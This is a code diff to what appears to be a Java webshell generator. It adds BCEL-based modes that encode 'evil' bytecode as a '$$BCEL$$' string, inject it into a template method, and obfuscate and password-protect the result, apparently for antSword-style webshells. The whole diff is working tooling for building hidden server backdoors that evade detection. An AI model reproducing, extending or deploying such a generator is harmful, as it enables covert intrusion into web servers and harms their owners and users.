@@ -10,6 +10,7 @@ import com.github.javaparser.ast.body.VariableDeclarator;
 import com.github.javaparser.ast.expr.ArrayInitializerExpr;
 import com.github.javaparser.ast.expr.StringLiteralExpr;
 import com.github.javaparser.ast.type.ClassOrInterfaceType;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
 import org.apache.log4j.Logger;
 import org.sec.Main;
 import org.sec.core.ByteCodeEvilDump;
@@ -57,14 +58,24 @@ public class Application {
                 doExpr(command);
                 return;
             }
+            if (command.bcelModule) {
+                logger.info("use bcel module");
+                doBcel(command);
+                return;
+            }
+            if (command.bcelAsmModule) {
+                logger.info("use bcel asm module");
+                doBcelAsm(command);
+                return;
+            }
             if (command.proxyModule) {
                 logger.info("use proxy module");
                 doProxy(command);
                 return;
             }
-            if (command.asmModule) {
-                logger.info("use asm module");
-                doAsm(command);
+            if (command.proxyAsmModule) {
+                logger.info("use proxy asm module");
+                doProxyAsm(command);
                 return;
             }
             if (command.antSword) {
@@ -93,9 +104,9 @@ public class Application {
         logger.info("finish");
     }
 
-    private static void doAsm(Command command) throws IOException {
+    private static void asmBase(Command command, String methodName) throws IOException {
         logger.info("read asm method");
-        MethodDeclaration newMethod = getMethod("Asm.java");
+        MethodDeclaration newMethod = getMethod(methodName);
         logger.info("read decrypt method");
         MethodDeclaration decMethod = getMethod("Dec.java");
         if (newMethod == null || decMethod == null) {
@@ -113,6 +124,42 @@ public class Application {
         normalOperate(newMethod);
         decCodeOperate(decMethod);
         WriteUtil.write(newMethod, decMethod, command.password, command.unicode, command.output);
+        logger.info("finish");
+    }
+
+    private static void doProxyAsm(Command command) throws IOException {
+        asmBase(command, "Asm.java");
+    }
+
+    private static void doBcelAsm(Command command) throws IOException {
+        asmBase(command, "BcelAsm.java");
+    }
+
+    private static void doBcel(Command command) throws IOException {
+        logger.info("read bcel method");
+        MethodDeclaration bcelMethod = getMethod("Bcel.java");
+        logger.info("read decrypt method");
+        MethodDeclaration decMethod = getMethod("Dec.java");
+        if (bcelMethod == null || decMethod == null) {
+            return;
+        }
+        byte[] resultByte = ByteCodeEvilDump.dump("test/ByteCodeEvil");
+        if (resultByte == null || resultByte.length == 0) {
+            return;
+        }
+        String byteCode = Utility.encode(resultByte, true);
+        byteCode = "$$BCEL$$" + byteCode;
+        logger.info("modify global array");
+        List<VariableDeclarator> vds = bcelMethod.findAll(VariableDeclarator.class);
+        for (VariableDeclarator vd : vds) {
+            if (vd.getNameAsString().equals("globalArr")) {
+                List<StringLiteralExpr> sles = vd.findAll(StringLiteralExpr.class);
+                sles.get(1).setValue(byteCode);
+            }
+        }
+        normalOperate(bcelMethod);
+        decCodeOperate(decMethod);
+        WriteUtil.write(bcelMethod, decMethod, command.password, command.unicode, command.output);
         logger.info("finish");
     }
 
